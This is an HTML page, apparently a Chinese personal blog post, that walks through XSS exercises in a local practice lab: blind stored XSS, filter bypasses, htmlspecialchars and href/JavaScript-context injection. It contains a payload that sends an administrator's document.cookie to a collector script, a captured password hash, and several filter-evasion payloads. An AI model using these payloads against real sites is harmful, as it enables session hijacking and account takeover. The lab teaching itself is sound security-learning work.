@@ -1,0 +1,684 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="liaoyue">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="XSS跨站——攻击常见环境模拟1.XSS之盲打&amp;emsp;&amp;emsp;打开查看界面，可以看到有两个输入点，一个是看法，一个是名字，不难猜出，这是与数据库连接的内容，尝试输入内容查看反映    &amp;emsp;&amp;emsp;可以看见回显只有一个谢谢参与，明显画大饼，不行，我们一定要攻击他，所谓的盲打就是无法直接在前端看到代码的反馈效果，盲打类型交互的数据一般是被存在数据库中，也就是上一篇提到的存储型XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS跨站——攻击常见环境模拟">
+<meta property="og:url" content="https://one-null-pointer.github.io/2023/03/02/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B%EF%BC%88%E4%BA%8C%EF%BC%89/index.html">
+<meta property="og:site_name" content="one-null-poniter">
+<meta property="og:description" content="XSS跨站——攻击常见环境模拟1.XSS之盲打&amp;emsp;&amp;emsp;打开查看界面，可以看到有两个输入点，一个是看法，一个是名字，不难猜出，这是与数据库连接的内容，尝试输入内容查看反映    &amp;emsp;&amp;emsp;可以看见回显只有一个谢谢参与，明显画大饼，不行，我们一定要攻击他，所谓的盲打就是无法直接在前端看到代码的反馈效果，盲打类型交互的数据一般是被存在数据库中，也就是上一篇提到的存储型XSS">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://one-null-pointer.github.io/img/web1.png">
+<meta property="article:published_time" content="2023-03-02T06:04:09.000Z">
+<meta property="article:modified_time" content="2023-03-04T09:31:11.528Z">
+<meta property="article:author" content="liaoyue">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://one-null-pointer.github.io/img/web1.png">
+  
+  
+  
+  <title>XSS跨站——攻击常见环境模拟 - one-null-poniter</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"one-null-pointer.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>one null pointer</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                吾
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                學
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                類
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="XSS跨站——攻击常见环境模拟"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-03-02 14:04" pubdate>
+          March 2, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.3k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          20 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">XSS跨站——攻击常见环境模拟</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="XSS跨站——攻击常见环境模拟"><a href="#XSS跨站——攻击常见环境模拟" class="headerlink" title="XSS跨站——攻击常见环境模拟"></a>XSS跨站——攻击常见环境模拟</h1><h4 id="1-XSS之盲打"><a href="#1-XSS之盲打" class="headerlink" title="1.XSS之盲打"></a>1.XSS之盲打</h4><p>&emsp;&emsp;打开查看界面，可以看到有两个输入点，一个是看法，一个是名字，不难猜出，这是与数据库连接的内容，尝试输入内容查看反映</p>
+<center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/1.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;可以看见回显只有一个谢谢参与，明显画大饼，不行，我们一定要攻击他，所谓的盲打就是无法直接在前端看到代码的反馈效果，盲打类型交互的数据一般是被存在数据库中，也就是上一篇提到的存储型XSS，一般有留言板，调查问卷，评论等内容信息的页面。</p>
+<p>&emsp;&emsp;这里不得不提一句，我一开始想着用测试代码试试，一直没反应，就多搞了几次，登入后面管理员查看的时候，直接崩了，我都不知道为啥</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/2.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;变向的证明了，如果如果没有过滤的话，恶心管理员是有一手的。当然，这并不是重点，我们的重点是传入代码获取到管理员的cookie值从而得到权限</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt; <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&#x27;http://127.0.0.1/PIKA/pkxss/xcookie/cookie.php?cookie=&#x27;</span>  +  <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>; &lt;/script&gt;<br><br><span class="hljs-comment">//我理解这段代码的意思是将管理员网页的cookie反馈到http://127.0.0.1/PIKA/pkxss/xcookie/cookie.php?的网址中，当我拿到你的cookie之后就能为所欲为了，嘿嘿（发出了反派的笑声）</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/3.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/4.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;可以看到在输入获取cookie的恶意代码后，当管理员登录后会直接执行该语句，向攻击者的工具传送cookie信息 ，管理员无法直接看到的，只有登录数据库看相关内容才能看见传送的语句</p>
+<center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/5.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;很好我们获取了cookie的内容，有了用户名和密码，但是密码经过了加密处理，这就使用kali的hash解密尝试一下咯，看看是什么加密方式</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">pw<span class="hljs-operator">=</span><span class="hljs-number">10470</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>b<span class="hljs-number">4</span>b<span class="hljs-number">1</span>fed<span class="hljs-number">12</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>baac<span class="hljs-number">014</span>be<span class="hljs-number">15</span>fac<span class="hljs-number">67</span><span class="hljs-keyword">c</span><span class="hljs-number">6e815</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/6.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+&emsp;&emsp;猜测出了哈希加密的方案种类，接下来就有两种方法，比较简单的hash加密可以遍历加密结果获得明文，另一种是直接是利用工具进行连接而不进行破解密码，比如使用Postman软件，直接导入cookie值，直接进
+
+<center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/7.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;</p>
+<h4 id="2-XSS之过滤"><a href="#2-XSS之过滤" class="headerlink" title="2.XSS之过滤"></a>2.XSS之过滤</h4><p>&emsp;&emsp;&emsp;这次是XSS过滤的绕过，有了之前sql注入的相关经验，可以明白，我们的绕过方法无非就是大小写变化、拼凑语句以及使用注释进行干扰等</p>
+<center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/8.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/9.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;可以看到常规的xss脚本无法执行，猜测可能是使用了相关的过滤，尝试前几个说的方法</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">//大小写</span><br>&lt;<span class="hljs-regexp">/a&gt;&lt;SCRIPT&gt;alert(&#x27;xss&#x27;)&lt;/</span>sCRIpt&gt;&lt;a&gt;<br><span class="hljs-comment">//拼凑语句</span><br>&lt;scri&lt;script&gt;pt&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)&lt;<span class="hljs-regexp">/scri&lt;/</span>script&gt;pt&gt;<br>&lt;<span class="hljs-variable constant_">SCR</span>&lt;<span class="hljs-variable constant_">SCRIPT</span>&gt;<span class="hljs-variable constant_">IPT</span>&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)&lt;<span class="hljs-regexp">/SC&lt;/</span>sCRIpt&gt;<span class="hljs-variable constant_">RIPT</span>&gt;<br><span class="hljs-comment">//注释进行干扰</span><br>&lt;scri&lt;!--liaoyue--&gt;pt&gt; <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>) &lt;/sc &lt;!--liaoyue--&gt; ript&gt;<br></code></pre></td></tr></table></figure>
+
+ <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/10.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;当我们大小写混淆拼写代码后，成功的绕过了后台的检测机制，达到了alert的目的，</p>
+<p>&emsp;</p>
+<h4 id="3-XSS之htmlspecialchars"><a href="#3-XSS之htmlspecialchars" class="headerlink" title="3.XSS之htmlspecialchars"></a>3.XSS之htmlspecialchars</h4><p>&emsp;&emsp;首先了解htmlspecialchars，它是函数的一种，作用是将预定义的字符转换为HTML实体，预定义的字符为：</p>
+<ul>
+<li>&amp;（和号)</li>
+<li>”(双引号）</li>
+<li>‘（单引号）</li>
+<li>＜(小于号)</li>
+<li>＞（大于号）</li>
+</ul>
+ <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/13.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&amp;<span class="hljs-tag">&lt;&gt;</span><br></code></pre></td></tr></table></figure>
+
+<center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/14.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;首先输入五种符号，查看转义情况，可以发现，五种符号中，单引号是没有被转义的，所以我们可以通过#’的办法将herf给闭合掉从而运行我们想要的语句了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">#&#x27; onclick=&#x27;alert(1)&#x27;<br></code></pre></td></tr></table></figure>
+
+ <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/11.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">#&#x27; onclick=&#x27;alert(&quot;xss&quot;)&#x27;<br></code></pre></td></tr></table></figure>
+
+ <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/12.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;</p>
+<h4 id="4-XSS之href输出"><a href="#4-XSS之href输出" class="headerlink" title="4.XSS之href输出"></a>4.XSS之href输出</h4><p>&emsp;&emsp;一般而言，href主要是实现对超链接进行转跳的功能，并且会有伴随着htmlspecialcharsd的协助，输出在a标签的href属性里面，可以使用JavaScript协议来执行语句</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&quot;XSS&quot;</span>)</span><br></code></pre></td></tr></table></figure>
+
+ <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/15.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;一般而言，在a标签的href属性汇总，一般放的是URL连接，所以会有规定输入必须以http或者https开头即可</p>
+<p>&emsp;</p>
+<h4 id="5-XSS之JavaScript输出"><a href="#5-XSS之JavaScript输出" class="headerlink" title="5.XSS之JavaScript输出"></a>5.XSS之JavaScript输出</h4><p>&emsp;&emsp;JavaScript里面是不会对tag和字符实体进行解释，所以需要进行js的转义，如果检验到JavaScript的代码，可以思考是否有攻击插入点</p>
+ <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/16.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+<p>&emsp;&emsp;明显用到了JavaScript上的界面变化，可以尝试构造闭合，然后插入我们需要的js语句</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+ <center><img src="/img/XSS%E8%B7%A8%E7%AB%99%E2%80%94%E2%80%94%E6%94%BB%E5%87%BB%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/17.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+</center>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/web/" class="category-chain-item">web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>XSS跨站——攻击常见环境模拟</div>
+      <div>https://one-null-pointer.github.io/2023/03/02/XSS跨站——攻击类型（二）/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>liaoyue</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>March 2, 2023</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>传送口</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="点击进行传送">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/03/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E4%B8%80/" title="前期准备——DOM了解">
+                        <span class="hidden-mobile">前期准备——DOM了解</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/" target="_blank" rel="nofollow noopener"><span>pointer</span></a> <i class="iconfont icon-love"></i> <a href="https://mp.weixin.qq.com/s/6ncLUtaiJ9j_sMjZT5z-2w" target="_blank" rel="nofollow noopener"><span>一个爱学习的空指针</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
